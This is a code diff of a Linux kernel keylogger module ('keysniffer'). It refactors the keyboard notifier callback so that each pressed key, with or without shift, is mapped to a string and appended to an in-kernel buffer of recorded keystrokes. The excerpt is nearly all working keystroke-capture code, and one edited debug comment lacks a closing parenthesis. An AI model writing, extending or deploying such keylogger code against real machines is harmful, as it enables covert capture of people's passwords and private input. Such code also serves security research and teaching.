@@ -109,6 +109,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 {
 	size_t len;
 	struct keyboard_notifier_param *param = _param;
+	const char * pressed_key;
 
 	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 		code, param->down, param->shift, param->value); */
@@ -117,37 +118,24 @@ int keysniffer_cb(struct notifier_block *nblock,
 		return NOTIFY_OK;
 
 	if (param->value >= 0x1 && param->value <= 0x77) {
-		if (param->shift && us_keymap[param->value][1]) {
-			len = strlen(us_keymap[param->value][1]);
+		pressed_key = param->shift
+				? us_keymap[param->value][1]
+				: us_keymap[param->value][0];
+		if (pressed_key) {
+			len = strlen(pressed_key);
 
 			if ((buf_pos + len) >= BUF_LEN) {
 				memset(keys_buf, 0, BUF_LEN);
 				buf_pos = 0;
 			}
 
-			strncpy(keys_buf + buf_pos,
-					us_keymap[param->value][1], len);
+			strncpy(keys_buf + buf_pos, pressed_key, len);
 			buf_pos += len;
 			keys_buf[buf_pos++] = '\n';
 
-			/* pr_debug("%s\n", us_keymap[param->value][1]); */
-		} else if (us_keymap[param->value][0]) {
-			len = strlen(us_keymap[param->value][0]);
-
-			if ((buf_pos + len) >= BUF_LEN) {
-				memset(keys_buf, 0, BUF_LEN);
-				buf_pos = 0;
-			}
-
-			strncpy(keys_buf + buf_pos,
-					us_keymap[param->value][0], len);
-			buf_pos += len;
-			keys_buf[buf_pos++] = '\n';
-
-			/* pr_debug("%s\n", us_keymap[param->value][0]); */
+			/* pr_debug("%s\n", pressed_key; */
 		}
 	}
-
 	return NOTIFY_OK;
 }
 
